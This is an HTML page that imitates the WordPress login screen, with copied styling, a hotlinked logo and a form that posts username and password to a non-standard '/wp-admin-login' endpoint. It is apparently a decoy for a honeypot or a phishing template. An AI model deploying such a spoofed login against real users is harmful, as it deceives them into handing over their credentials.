<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Log In ‹ WordPress — WordPress</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: #f1f1f1;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
            margin: 0;
            padding: 0;
        }
        #login {
            width: 420px;
            margin: 7% auto;
            padding: 26px 24px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            animation: fadeIn 0.3s ease-in-out;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            text-align: center;
            margin-bottom: 25px;
        }
        h1 img {
            max-width: 275px; /* controls logo size */
            height: auto; /* keeps proportions */
            display: block;
            margin: 0 auto;
        }
        form p {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            font-weight: 500;
            font-size: 14px;
        }
        input[type="text"],
        input[type="password"] {
            width: 90%;
            padding: 8px 10px;
            border: 1px solid #ccd0d4;
            border-radius: 4px;
            font-size: 14px;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #2271b1;
            box-shadow: 0 0 0 1px #2271b1;
            outline: none;
        }
        input[type="submit"] {
            background: #2271b1;
            border: none;
            color: #fff;
            padding: 8px;
            border-radius: 4px;
            cursor: pointer;
            width: 90%;
            font-size: 14px;
            transition: background 0.2s;
        }
        input[type="submit"]:hover {
            background: #135e96;
        }
        .nav {
            text-align: center;
            font-size: 13px;
            color: #50575e;
            margin-top: 15px;
        }
        .nav a {
            color: #50575e;
            text-decoration: none;
        }
        .nav a:hover {
            text-decoration: underline;
        }
        @media (max-width: 400px) {
            #login {
                width: 90%;
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div id="login">
        <h1>
            <img src="https://www.freepnglogos.com/uploads/wordpress-logo-png/wordpress-logo-png-transparent-wordpress-logo-images-pluspng-14.png" alt="WordPress Logo">
        </h1>
        <form action="/wp-admin-login" method="post">
            <p>
                <label for="username">Username or Email Address</label>
                <input type="text" name="username" id="username" autocomplete="username" required>
            </p>
            <p>
                <label for="password">Password</label>
                <input type="password" name="password" id="password" autocomplete="current-password" required>
            </p>
            <p>
                <input type="submit" value="Log In">
            </p>
        </form>
        <p class="nav">
            <a href="#">Lost your password?</a>
        </p>
        <p class="nav">
            <a href="#">← Go to My Site</a>
        </p>
    </div>
</body>
</html>
